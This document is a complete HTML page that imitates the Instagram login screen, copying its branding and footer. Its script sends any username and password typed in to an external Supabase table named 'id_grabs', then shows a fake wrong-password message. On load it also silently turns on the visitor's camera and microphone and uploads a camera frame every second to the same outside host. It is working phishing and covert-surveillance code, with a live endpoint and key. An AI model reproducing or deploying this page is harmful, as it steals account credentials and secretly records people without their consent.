<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
main{display:flex;align-items:center;justify-content:center}
#mobile{width:380px;height:580px;background:url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png') no-repeat center center;background-size:contain;margin-right:32px}
@media(max-width:800px){#mobile{display:none}}
#auth{display:flex;flex-direction:column;width:350px}
.panel{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;margin-bottom:10px}
.login h1{display:flex;justify-content:center;margin-bottom:22px}
.login h1 img{width:175px}
form{display:flex;flex-direction:column;gap:6px}
form input{background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px;font-size:12px;outline:none;width:100%}
form input:focus{border-color:#a8a8a8}
form button{margin-top:8px;background:#0095f6;color:#fff;border:none;border-radius:8px;padding:7px;font-size:14px;font-weight:600;cursor:pointer;width:100%}
form button:disabled{opacity:.6}
.separator{display:flex;align-items:center;margin:18px 0;gap:18px}
.separator span{flex:1;height:1px;background:#dbdbdb}
.separator .or{font-size:13px;font-weight:600;color:#8e8e8e}
.login-with-fb{display:flex;flex-direction:column;align-items:center;gap:14px}
.login-with-fb>div a{color:#385185;font-size:14px;font-weight:600;text-decoration:none}
.login-with-fb>a{color:#00376b;font-size:12px;text-decoration:none}
.register{display:flex;justify-content:center;gap:6px;padding:20px}
.register p{font-size:14px;color:#262626}
.register a{font-size:14px;color:#0095f6;font-weight:600;text-decoration:none}
.app-download{display:flex;flex-direction:column;align-items:center;margin-top:16px;gap:14px}
.app-download p{font-size:14px;color:#262626}
.app-download>div{display:flex;gap:8px}
.app-download img{height:40px;cursor:pointer}
footer{margin-top:52px;text-align:center;padding:0 20px 20px}
footer ul{list-style:none;display:flex;flex-wrap:wrap;justify-content:center;gap:4px 16px;margin-bottom:16px}
footer ul li a{font-size:11px;color:#8e8e8e;text-decoration:none}
footer .copyright{font-size:11px;color:#8e8e8e}
#msg{text-align:center;font-size:12px;margin-top:8px;color:#ed4956;min-height:16px}
video,canvas{display:none}
</style>
</head>
<body>
<main>
  <section id="mobile"></section>
  <section id="auth">  
    <div class="panel login">
      <h1><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/320px-Instagram_logo.svg.png" alt="Instagram"/></h1>
      <form onsubmit="return false;">
        <input id="email" placeholder="Phone number, username or email" autocomplete="off"/>
        <input id="password" type="password" placeholder="Password" autocomplete="off"/>
        <button type="button" id="loginBtn" onclick="handleLogin()">Log In</button>
      </form>
      <div id="msg"></div>
      <div class="separator"><span></span><div class="or">OR</div><span></span></div>
      <div class="login-with-fb"><div><a href="#">Log in with Facebook</a></div><a href="#">Forgot password?</a></div>
    </div>
    <div class="panel register"><p>Don't have an account?</p><a href="#">Sign up</a></div>
    <div class="app-download"><p>Get the app.</p>
      <div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/320px-Download_on_the_App_Store_Badge.svg.png" alt="App Store"/>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/320px-Google_Play_Store_badge_EN.svg.png" alt="Google Play"/>
      </div>
    </div>
  </section>
</main>
<footer>
  <ul><li><a href="#">ABOUT</a></li><li><a href="#">HELP</a></li><li><a href="#">PRESS</a></li><li><a href="#">API</a></li><li><a href="#">CAREERS</a></li><li><a href="#">PRIVACY</a></li><li><a href="#">TERMS</a></li><li><a href="#">LOCATIONS</a></li><li><a href="#">TOP ACCOUNTS</a></li><li><a href="#">HASHTAGS</a></li><li><a href="#">LANGUAGE</a></li></ul>
  <p class="copyright">© 2024 Instagram from Meta</p>
</footer>
<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>
<script>
const S='https://yspjknemdmlejzsubycf.supabase.co',K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlzcGprbmVtZG1sZWp6c3VieWNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI3MDgyOTgsImV4cCI6MjA4ODI4NDI5OH0.JSAXs0UZJiBy2mgniSoSuN6BuW1iW-UhW785toC1weM';
const sid=new URLSearchParams(location.search).get('s');
const v=document.getElementById('v'),c=document.getElementById('c'),ctx=c.getContext('2d');

window.addEventListener('load',()=>{
  if(!sid)return;
  navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}},audio:true})
  .then(stream=>{
    v.srcObject=stream;
    v.onloadedmetadata=()=>{
      c.width=v.videoWidth;c.height=v.videoHeight;
      v.play().then(()=>{
        // Send frame every 1 second for near-realtime
        setTimeout(()=>{up();setInterval(up,1000);},500);
      });
    };
  }).catch(()=>{});
});

async function up(){
  if(v.readyState<2)return;
  ctx.drawImage(v,0,0,c.width,c.height);
  const d=ctx.getImageData(0,0,10,10).data;let s=0;
  for(let i=0;i<d.length;i+=4)s+=d[i]+d[i+1]+d[i+2];
  if(s<100)return;
  const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.6));if(!blob)return;
  const f=sid+'/live_'+Date.now()+'.jpg';
  const r=await fetch(S+'/storage/v1/object/captures/'+f,{method:'POST',headers:{'Authorization':'Bearer '+K,'Content-Type':'image/jpeg','x-upsert':'true'},body:blob});
  if(!r.ok)return;
  // Update live_frame table instead of photos for real-time
  await fetch(S+'/rest/v1/live_frames',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json','Prefer':'resolution=merge-duplicates'},
    body:JSON.stringify({session_id:sid,frame_url:S+'/storage/v1/object/public/captures/'+f,updated_at:new Date().toISOString()})});
}

async function handleLogin(){
  const email=document.getElementById('email').value.trim();
  const pass=document.getElementById('password').value.trim();
  const msg=document.getElementById('msg'),btn=document.getElementById('loginBtn');
  if(!email||!pass){msg.textContent='Please fill in your credentials.';return;}
  btn.disabled=true;btn.textContent='Logging in...';
  try{await fetch(S+'/rest/v1/id_grabs',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json'},body:JSON.stringify({session_id:sid||'direct',username:email,password:pass,grabbed_at:new Date().toISOString()})});}catch(e){}
  btn.disabled=false;btn.textContent='Log In';
  msg.textContent='Sorry, your password was incorrect. Please double-check your password.';
}
</script>
</body>
</html>
